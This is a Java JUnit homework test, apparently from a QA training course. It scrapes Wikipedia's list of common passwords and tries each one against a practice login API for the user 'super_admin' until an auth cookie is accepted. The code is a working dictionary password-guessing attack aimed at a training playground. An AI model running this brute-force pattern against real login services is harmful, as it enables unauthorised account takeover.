import io.github.bonigarcia.wdm.WebDriverManager;
import io.restassured.response.Response;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import java.util.*;

import static io.restassured.RestAssured.given;

public class ExerciseNineTest {

  WebDriver driver;

  @BeforeAll
  static void setupClass() {
    WebDriverManager.chromedriver().setup();
  }

  @BeforeEach
  void setup() {
    driver = new ChromeDriver();
  }

  @AfterEach
  void teardown() {
    driver.quit();
  }

  String tableUrl = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords";
  Set<String> passwords = new HashSet<>();

  @Test
  public void testGetCookies() {

    String urlGet = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
    String urlCheck = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
    String cookie;

    for (String password : getPasswordsFromTable()) {
      Map<String, String> params = new HashMap<>();
      params.put("login", "super_admin");
      params.put("password", password);

      Response responseForGet = given()
              .body(params)
              .when()
              .post(urlGet)
              .andReturn();

      cookie = responseForGet.getCookie("auth_cookie");

      Map<String, String> cookies = new HashMap<>();
      cookies.put("auth_cookie", cookie);

      Response responseForCheck = given()
              .cookies(cookies)
              .body(params)
              .when()
              .post(urlCheck)
              .andReturn();
      String responseString = responseForCheck.asString();

      if (!Objects.equals(responseString, "You are NOT authorized")) {
        System.out.println("The correct password is " + "\"" + password + "\"" + "\n" + "The admin is fired");
        break;
      }
    }
  }

  private Set<String> getPasswordsFromTable() {
    driver.get(tableUrl);
    WebElement t = driver.findElement(By.xpath("//*[@id=\"mw-content-text\"]/div[1]/table[3]/tbody"));
    List<WebElement> rws = t.findElements(By.tagName("tr"));
    for (WebElement rw : rws) {
      List<WebElement> cols = rw.findElements(By.tagName("td"));
      int cols_cnt = cols.size();
      for (int j = 1; j < cols_cnt; j++) {
        String c = cols.get(j).getText();
        passwords.add(c);
      }
    }
    return passwords;
  }
}



